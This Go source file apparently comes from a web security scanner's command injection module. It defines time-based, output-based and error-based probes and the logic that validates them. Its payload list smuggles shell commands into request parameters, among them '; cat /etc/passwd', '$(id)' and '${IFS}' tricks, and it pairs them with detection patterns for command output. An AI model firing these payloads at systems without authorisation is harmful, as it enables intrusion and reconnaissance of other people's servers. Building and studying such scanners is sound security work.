package scanner

import (
	"context"
	"crypto/md5"
	"fmt"
	"math/rand"
	"regexp"
	"strings"
	"time"

	"github.com/GhostN3xus/Huntsuite/pkg/logging"
)

// Command Injection Scanner - Detects OS command injection vulnerabilities
// This module performs REAL validation using multiple techniques:
// 1. Time-based detection (sleep commands)
// 2. Output-based detection (unique markers)
// 3. Error-based detection (command errors)

// Command injection payloads with different separators and techniques
func getCMDIPayloads(marker string, sleepTime int) []string {
	return []string{
		// Time-based payloads - Linux/Unix
		fmt.Sprintf("; sleep %d", sleepTime),
		fmt.Sprintf("| sleep %d", sleepTime),
		fmt.Sprintf("& sleep %d &", sleepTime),
		fmt.Sprintf("&& sleep %d", sleepTime),
		fmt.Sprintf("|| sleep %d", sleepTime),
		fmt.Sprintf("`sleep %d`", sleepTime),
		fmt.Sprintf("$(sleep %d)", sleepTime),
		fmt.Sprintf("\nsleep %d\n", sleepTime),
		fmt.Sprintf("; sleep %d #", sleepTime),
		fmt.Sprintf("' ; sleep %d ; '", sleepTime),
		fmt.Sprintf("\" ; sleep %d ; \"", sleepTime),

		// Time-based payloads - Windows
		fmt.Sprintf("& timeout /t %d", sleepTime),
		fmt.Sprintf("&& timeout /t %d", sleepTime),
		fmt.Sprintf("| timeout /t %d", sleepTime),
		fmt.Sprintf("|| timeout /t %d", sleepTime),
		fmt.Sprintf("; timeout /t %d", sleepTime),

		// Output-based payloads with unique marker
		fmt.Sprintf("; echo %s", marker),
		fmt.Sprintf("| echo %s", marker),
		fmt.Sprintf("& echo %s &", marker),
		fmt.Sprintf("&& echo %s", marker),
		fmt.Sprintf("|| echo %s", marker),
		fmt.Sprintf("`echo %s`", marker),
		fmt.Sprintf("$(echo %s)", marker),
		fmt.Sprintf("\necho %s\n", marker),

		// Combined payloads
		fmt.Sprintf("; echo %s; sleep %d", marker, sleepTime),
		fmt.Sprintf("&& echo %s && sleep %d", marker, sleepTime),

		// Backtick execution
		"`id`",
		"`whoami`",
		"`pwd`",
		"$(id)",
		"$(whoami)",
		"$(pwd)",

		// Error-based detection
		"; cat /etc/passwd",
		"| cat /etc/passwd",
		"& type C:\\Windows\\win.ini",
		"&& cat /etc/passwd",

		// Multiple command separators
		"; id; ",
		"| id |",
		"& id &",
		"&& id",
		"|| id",

		// With quotes to break out of context
		"'; echo " + marker + " ;'",
		"\"; echo " + marker + " ;\"",
		"' && echo " + marker + " && '",
		"\" && echo " + marker + " && \"",

		// Newline injection
		"%0aecho " + marker,
		"%0decho " + marker,
		"%0a%0decho " + marker,
		"\necho " + marker + "\n",

		// Space alternatives
		fmt.Sprintf(";echo${IFS}%s", marker),
		fmt.Sprintf("&&echo${IFS}%s", marker),
		fmt.Sprintf(";echo$IFS$9%s", marker),

		// With command substitution
		fmt.Sprintf(";echo `echo %s`", marker),
		fmt.Sprintf("&&echo $(echo %s)", marker),
	}
}

// scanCMDI performs Command Injection scanning with REAL validation
func (e *Engine) scanCMDI(ctx context.Context, target string, points []injectionPoint, opts Options) error {
	if !opts.EnableCMDI {
		return nil
	}

	e.logger.Info("starting Command Injection scan", logging.Fields{
		"target": target,
		"points": len(points),
	})

	for _, point := range points {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		// Generate unique marker for this test
		marker := generateUniqueMarker()
		sleepTime := 5 // seconds

		payloads := getCMDIPayloads(marker, sleepTime)

		for _, payload := range payloads {
			select {
			case <-ctx.Done():
				return ctx.Err()
			default:
			}

			// Create request with payload
			req := point.templateForValue(payload)

			// Measure response time for time-based detection
			startTime := time.Now()
			resp, err := e.executeRequest(ctx, req, opts)
			elapsed := time.Since(startTime)

			if err != nil {
				continue
			}

			// Perform REAL validation
			validationType, confidence := e.validateCMDI(payload, marker, resp, elapsed, sleepTime)

			if validationType != "" {
				severity := SeverityHigh
				if confidence < 0.8 {
					severity = SeverityMedium
				}

				finding := Finding{
					Title:       "Command Injection Vulnerability",
					Type:        "CMDI",
					Severity:    severity,
					Description: fmt.Sprintf("Command Injection vulnerability detected in %s using %s validation. The application executes OS commands with user-controlled input.", point.label(), validationType),
					Evidence: fmt.Sprintf("Payload: %s\nValidation: %s\nConfidence: %.2f\nResponse time: %v",
						payload, validationType, confidence, elapsed),
					PoC: fmt.Sprintf("curl -X %s '%s'\n\nThe application is vulnerable to command injection. An attacker can execute arbitrary OS commands.",
						req.Method, req.URL),
				}

				e.reportFinding(ctx, finding, point, req, resp)

				e.logger.Warn("Command Injection vulnerability found", logging.Fields{
					"severity":   string(finding.Severity),
					"type":       finding.Type,
					"target":     req.URL,
					"validation": validationType,
					"confidence": confidence,
				})

				// Found a vulnerability, move to next injection point
				break
			}
		}
	}

	e.logger.Info("Command Injection scan completed", logging.Fields{"target": target})
	return nil
}

// validateCMDI performs REAL validation using multiple techniques
// Returns validation type and confidence score (0.0 to 1.0)
func (e *Engine) validateCMDI(payload string, marker string, resp responsePayload, elapsed time.Duration, expectedSleep int) (string, float64) {
	body := string(resp.Body)
	bodyLower := strings.ToLower(body)

	// 1. Time-based validation
	if strings.Contains(payload, "sleep") || strings.Contains(payload, "timeout") {
		expectedDuration := time.Duration(expectedSleep) * time.Second
		tolerance := 1 * time.Second

		if elapsed >= expectedDuration-tolerance && elapsed <= expectedDuration+tolerance*3 {
			confidence := 0.9
			if elapsed < expectedDuration {
				confidence = 0.7
			}
			e.logger.Debug("time-based CMDI detected", logging.Fields{
				"elapsed":  elapsed,
				"expected": expectedDuration,
				"payload":  payload,
			})
			return "time-based", confidence
		}
	}

	// 2. Output-based validation - Check for our unique marker
	if strings.Contains(body, marker) {
		e.logger.Debug("output-based CMDI detected", logging.Fields{
			"marker":  marker,
			"payload": payload,
		})
		return "output-based", 1.0 // Highest confidence
	}

	// 3. Error-based validation - Look for command execution errors
	errorPatterns := []string{
		"sh: ",
		"bash: ",
		"cmd: ",
		"command not found",
		"is not recognized as",
		"internal or external command",
		"cannot access",
		"permission denied",
		"syntax error",
		"/bin/sh: ",
		"/bin/bash: ",
		"'cmd' is not recognized",
		"'powershell' is not recognized",
	}

	for _, pattern := range errorPatterns {
		if strings.Contains(bodyLower, strings.ToLower(pattern)) {
			e.logger.Debug("error-based CMDI detected", logging.Fields{
				"pattern": pattern,
				"payload": payload,
			})
			return "error-based", 0.85
		}
	}

	// 4. Check for command output patterns
	if resp.StatusCode == 200 {
		// Look for typical command output patterns
		commandOutputPatterns := []string{
			// Linux command outputs
			`uid=\d+`,
			`gid=\d+`,
			`root:.*:0:0:`,
			`/bin/bash`,
			`/bin/sh`,
			`/home/`,
			`/var/www`,

			// Windows command outputs
			`C:\\Windows`,
			`C:\\Program Files`,
			`Volume Serial Number`,
			`Directory of`,
		}

		for _, pattern := range commandOutputPatterns {
			matched, _ := regexp.MatchString(pattern, body)
			if matched {
				e.logger.Debug("command output pattern detected", logging.Fields{
					"pattern": pattern,
					"payload": payload,
				})
				return "output-pattern", 0.75
			}
		}
	}

	// 5. Check for blind injection indicators
	// Some payloads might not produce visible output but still execute
	if strings.Contains(payload, "sleep") || strings.Contains(payload, "timeout") {
		// If we got here with a sleep payload and response time is significantly different
		// from normal, it might indicate successful injection
		if elapsed > 2*time.Second && resp.StatusCode == 200 {
			return "time-based-heuristic", 0.6
		}
	}

	return "", 0.0 // No validation passed
}

// generateUniqueMarker generates a unique marker for command injection testing
func generateUniqueMarker() string {
	rand.Seed(time.Now().UnixNano())
	randomData := fmt.Sprintf("%d%d", time.Now().UnixNano(), rand.Int())
	hash := md5.Sum([]byte(randomData))
	return fmt.Sprintf("CMDI_%x", hash)[:16]
}
